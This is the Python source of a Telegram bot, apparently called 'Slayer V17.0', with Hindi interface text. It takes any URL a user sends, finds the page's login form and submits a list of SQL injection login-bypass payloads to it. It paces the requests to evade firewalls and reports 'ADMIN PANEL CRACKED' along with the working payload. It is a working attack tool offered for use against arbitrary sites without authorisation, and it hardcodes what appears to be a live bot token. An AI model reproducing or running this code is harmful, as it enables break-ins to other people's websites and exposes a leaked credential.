import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
import urllib.parse
import os
from flask import Flask
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Render Keep-Alive
app = Flask('')
@app.route('/')
def home(): return "Slayer V17.0 (Live Progress) is Online!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# पावरफुल पेलोड लाइब्रेरी
SQL_LIBRARY = [
    "' or 1=1--", "admin' --", "admin' #", "' or 1=1 LIMIT 1--", 
    "admin' OR '1'='1'--", "') OR ('1'='1", "' OR SLEEP(5)--",
    "admin'/*", "' or ''='", "admin\" or 1=1--", "' OR 1=1#"
]

STRICT_KEYWORDS = ["logout", "signout", "dashboard", "admin panel", "welcome", "manage"]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🎯 **Slayer V17.0 (Live Attack Mode)**\n\nURL भेजें। अब मैं आपको हर पेलोड की टेस्टिंग का **Live Update** दूँगा।")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack_init(message):
    target_url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 एनालिसिस शुरू... लाइव ट्रैकिंग एक्टिवेट हो रही है।")

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})

    try:
        res = session.get(target_url, timeout=15)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.edit_message_text("❌ एरर: इस पेज पर कोई फॉर्म नहीं मिला।", chat_id, status_msg.message_id)
            return

        inputs = form.find_all('input')
        # सुरक्षित रूप से इनपुट नाम निकालना ताकि 'index out of range' न आए
        input_names = [i.get('name') for i in inputs if i.get('name') and i.get('type') != 'hidden']
        
        if len(input_names) < 2:
            input_names = [i.get('name') for i in inputs if i.get('name')]

        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names) > 1 else 'password')

        bot.edit_message_text(f"🚀 **Attack Started!**\nTarget: `{target_url}`\n\n**Live Status:** Testing Payloads...", chat_id, status_msg.message_id)

        found_info = {"success": False, "count": 0}

        # मल्टी-थ्रेडिंग के साथ पेलोड रन करना
        total = len(SQL_LIBRARY)
        for i, p in enumerate(SQL_LIBRARY):
            if found_info["success"]: break
            
            # हर पेलोड पर स्टेटस अपडेट करना (ताकि आपको पता चले बोट काम कर रहा है)
            try:
                bot.edit_message_text(f"⚔️ **Attack Running...**\n\n🔄 Testing: `{p}`\n📊 Progress: `{i+1}/{total}`\n⌛ Status: Searching for Admin Panel...", chat_id, status_msg.message_id)
            except: pass

            verification_engine(target_url, session, user_key, pass_key, p, chat_id, found_info)
            time.sleep(1.2) # WAF से बचने के लिए छोटा गैप

        if not found_info["success"]:
            bot.send_message(chat_id, "ℹ️ अटैक खत्म। इस वेबसाइट पर कोई स्पष्ट कमजोरी नहीं मिली।")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

def verification_engine(url, session, u_key, p_key, p, chat_id, found_info):
    if found_info["success"]: return
    try:
        data = {u_key: p, p_key: p}
        r = session.post(url, data=data, timeout=15, allow_redirects=True)
        content = r.text.lower()
        
        # पक्का सबूत चेक करना
        is_verified = any(word in content for word in STRICT_KEYWORDS) or ("/admin" in r.url.lower() and r.url != url)

        if is_verified:
            found_info["success"] = True
            report_path = f"Verified_Report_{chat_id}.txt"
            with open(report_path, "w") as f:
                f.write(f"--- VERIFIED SQL SUCCESS REPORT ---\n\nTarget: {url}\nPayload: {p}\nStatus: ACCESS GRANTED\nURL: {r.url}\n\nNote: Copy the payload and use it in your browser login.")
            
            with open(report_path, "rb") as doc:
                bot.send_document(chat_id, doc, caption=f"🏆 **SUCCESS! ADMIN PANEL CRACKED**\n\nपेलोड: `{p}`\n\nऊपर दी गई रिपोर्ट फाइल डाउनलोड करें।")
            os.remove(report_path)
    except: pass

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
